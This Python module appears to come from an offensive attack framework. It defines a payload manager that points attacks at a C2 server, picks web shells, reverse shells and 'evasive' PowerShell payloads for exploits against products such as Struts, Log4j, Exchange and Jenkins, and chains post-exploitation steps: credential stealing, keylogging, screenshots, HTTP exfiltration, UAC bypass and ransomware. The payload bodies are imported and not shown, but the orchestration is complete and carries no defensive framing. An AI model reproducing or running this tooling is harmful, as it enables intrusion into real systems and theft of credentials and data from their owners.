"""
Payload Manager
Integrates payloads with exploits for maximum effectiveness
"""

import os
import sys
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from payloads.payload_generator import PayloadGenerator
from payloads.specialized_payloads import SpecializedPayloads
from utils.logger import logger


class PayloadManager:
    """
    Payload Manager
    
    Manages payload selection and deployment
    Integrates with exploit system
    """
    
    def __init__(self, c2_server: str = "127.0.0.1", c2_port: int = 4444):
        self.c2_server = c2_server
        self.c2_port = c2_port
        
        self.generator = PayloadGenerator(c2_server, c2_port)
        self.specialized = SpecializedPayloads(c2_server, c2_port)
        
        self.stats = {
            'payloads_generated': 0,
            'payloads_deployed': 0,
            'successful_callbacks': 0
        }
    
    def select_payload(self, target: Dict, exploit_type: str) -> str:
        """
        Select optimal payload for target
        
        Args:
            target: Target information (OS, ports, etc.)
            exploit_type: Type of exploit used
        
        Returns:
            Optimal payload for target
        """
        
        os_type = target.get('os_guess', 'unknown').lower()
        
        # Determine payload based on OS and exploit
        if 'windows' in os_type:
            return self._select_windows_payload(target, exploit_type)
        elif 'linux' in os_type:
            return self._select_linux_payload(target, exploit_type)
        else:
            # Default to cross-platform
            return self._select_generic_payload(target, exploit_type)
    
    def _select_windows_payload(self, target: Dict, exploit_type: str) -> str:
        """Select Windows payload"""
        
        # For web exploits, use web shell
        if 'web' in exploit_type.lower() or 'http' in exploit_type.lower():
            return self.generator.generate_web_shell('aspx')
        
        # For RCE exploits, use reverse shell
        elif 'rce' in exploit_type.lower() or 'exec' in exploit_type.lower():
            # Use evasive PowerShell reverse shell
            base_payload = self.generator.generate_reverse_shell('windows', 'powershell')
            return self.generator.generate_evasive_payload(base_payload, evasion_level=2)
        
        # Default: staged payload
        else:
            stage1, stage2 = self.generator.generate_staged_payload('windows')
            return stage1
    
    def _select_linux_payload(self, target: Dict, exploit_type: str) -> str:
        """Select Linux payload"""
        
        # For web exploits, use PHP shell
        if 'web' in exploit_type.lower():
            return self.generator.generate_web_shell('php')
        
        # For SSH/RCE, use bash reverse shell
        elif 'ssh' in exploit_type.lower() or 'rce' in exploit_type.lower():
            return self.generator.generate_reverse_shell('linux', 'tcp')
        
        # Default: Python reverse shell
        else:
            return self.generator.generate_reverse_shell('linux', 'python')
    
    def _select_generic_payload(self, target: Dict, exploit_type: str) -> str:
        """Select generic cross-platform payload"""
        
        # Try Python (works on most systems)
        return self.generator.generate_reverse_shell('linux', 'python')
    
    def generate_post_exploit_payload(self, objective: str, target_os: str = 'windows') -> str:
        """
        Generate post-exploitation payload
        
        Args:
            objective: What to do (creds, keylog, screenshot, etc.)
            target_os: Target operating system
        
        Returns:
            Specialized payload
        """
        
        if objective == 'credentials':
            return self.specialized.generate_credential_stealer('all')
        
        elif objective == 'keylog':
            return self.specialized.generate_keylogger('network')
        
        elif objective == 'screenshot':
            return self.specialized.generate_screenshot_payload()
        
        elif objective == 'exfiltrate':
            return self.specialized.generate_exfiltration_payload('http')
        
        elif objective == 'privesc':
            return self.specialized.generate_privesc_payload('uac_bypass')
        
        elif objective == 'ransomware_sim':
            return self.specialized.generate_ransomware_payload(simulation=True)
        
        return ""
    
    def create_payload_chain(self, target: Dict, objectives: List[str]) -> List[str]:
        """
        Create chain of payloads for multi-stage attack
        
        Args:
            target: Target information
            objectives: List of objectives (in order)
        
        Returns:
            List of payloads to execute in sequence
        """
        
        payload_chain = []
        os_type = target.get('os_guess', 'windows')
        
        for objective in objectives:
            payload = self.generate_post_exploit_payload(objective, os_type)
            if payload:
                payload_chain.append(payload)
        
        return payload_chain
    
    def get_payload_for_exploit(self, exploit_name: str, target: Dict) -> str:
        """
        Get specific payload for exploit
        
        Args:
            exploit_name: Name of exploit
            target: Target information
        
        Returns:
            Optimal payload
        """
        
        # Map exploits to optimal payloads
        exploit_payload_map = {
            'struts': 'web',
            'log4j': 'reverse_shell',
            'exchange': 'web',
            'weblogic': 'reverse_shell',
            'citrix': 'web',
            'confluence': 'web',
            'jira': 'web',
            'gitlab': 'web',
            'jenkins': 'reverse_shell',
            'tomcat': 'web'
        }
        
        # Find matching exploit type
        payload_type = 'reverse_shell'  # default
        for key, value in exploit_payload_map.items():
            if key in exploit_name.lower():
                payload_type = value
                break
        
        # Generate appropriate payload
        if payload_type == 'web':
            os_type = target.get('os_guess', 'linux').lower()
            if 'windows' in os_type:
                return self.generator.generate_web_shell('aspx')
            else:
                return self.generator.generate_web_shell('php')
        
        elif payload_type == 'reverse_shell':
            os_type = target.get('os_guess', 'windows').lower()
            if 'windows' in os_type:
                base = self.generator.generate_reverse_shell('windows', 'powershell')
                return self.generator.generate_evasive_payload(base, evasion_level=2)
            else:
                return self.generator.generate_reverse_shell('linux', 'tcp')
        
        return ""
    
    def get_statistics(self) -> Dict:
        """Get payload statistics"""
        return {
            **self.stats,
            'c2_server': self.c2_server,
            'c2_port': self.c2_port
        }


if __name__ == "__main__":
    # Test payload manager
    manager = PayloadManager(c2_server="192.168.1.100", c2_port=4444)
    
    test_target = {
        'ip': '192.168.1.50',
        'os_guess': 'Windows 10',
        'open_ports': [80, 443, 8080]
    }
    
    print("="*60)
    print("PAYLOAD MANAGER TEST")
    print("="*60)
    
    print("\n1. Select payload for Struts exploit:")
    payload = manager.get_payload_for_exploit('Apache_Struts', test_target)
    print(payload[:200] + "...")
    
    print("\n2. Generate post-exploit payload (credentials):")
    cred_payload = manager.generate_post_exploit_payload('credentials', 'windows')
    print(cred_payload[:200] + "...")
    
    print("\n3. Create payload chain:")
    objectives = ['credentials', 'screenshot', 'exfiltrate']
    chain = manager.create_payload_chain(test_target, objectives)
    print(f"Generated {len(chain)} payloads in chain")
    
    print("\n4. Statistics:")
    print(manager.get_statistics())
    
    print("\n" + "="*60)
